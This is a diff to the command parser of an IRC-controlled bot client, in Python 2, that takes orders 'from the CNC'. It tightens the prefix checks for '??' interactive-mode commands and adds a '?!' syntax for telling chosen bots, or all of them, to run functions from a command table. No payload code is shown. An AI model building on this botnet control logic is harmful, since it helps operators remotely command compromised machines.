@@ -182,21 +182,21 @@ def parseCommand(command):
 			print "Recieved %s from the CNC" % command #print command
 
 			if INTERACT[0]: #if interactive shell is on
-				if "??finish" in command:
+				if "??finish" == command[:8]:
 					INTERACT[0] = 0
 					return
-				elif "??-" in command:
+				elif "??-" == command[:3]:
 					users = command[3:].split(" ")
 					if nick in users or "all" in users:
 						INTERACT[1] = 0
 
 					return
-				elif "??+" in command:
+				elif "??+" == command[:3]:
 					return
 
 				if len(command) > 0:
 					sendData("I would have performed: '" + command + "'")
-			elif "??" in command: #if '??' is given
+			elif "??" == command[:2]: #if '??' is given
 				INTERACT[0] = 1
 				users = command[2:].split(" ")
 
@@ -208,6 +208,19 @@ def parseCommand(command):
 				if not nick in users and not "all" in users:
 					INTERACT[1] = 0
 					return
+			elif "?!" == command[:2]: #if they want to single out one or more bots to run a function
+				if ":" in command:
+					lines = command[2:].split(":")
+				else:
+					print "incorrect syntax. you need a ':'"
+					return
+
+				users = lines[0].split(" ")
+				if nick in users or "all" in users:
+					lines[1] = lines[1].strip()
+					if lines[1] in commands.keys(): #if regular command
+						commands[lines[1]]() #call appropriate function
+						print "function called"
 			else:
 				if command in commands.keys(): #if regular command
 					commands[command]() #call appropriate function
@@ -223,10 +236,10 @@ def parseCommand(command):
 		if "PRIVMSG" in command:
 			command = command[command.index("PRIVMSG"):]
 			command = command[(command.index(':') + 1):].strip().lower()
-			if "??finish" in command:
+			if "??finish" == command[:8]:
 				INTERACT[0] = 0
 				INTERACT[1] = 1
-			elif "??+" in command:
+			elif "??+" == command[:3]:
 				users = command[3:].split(" ")
 				if nick in users or "all" in users:
 					INTERACT[1] = 1
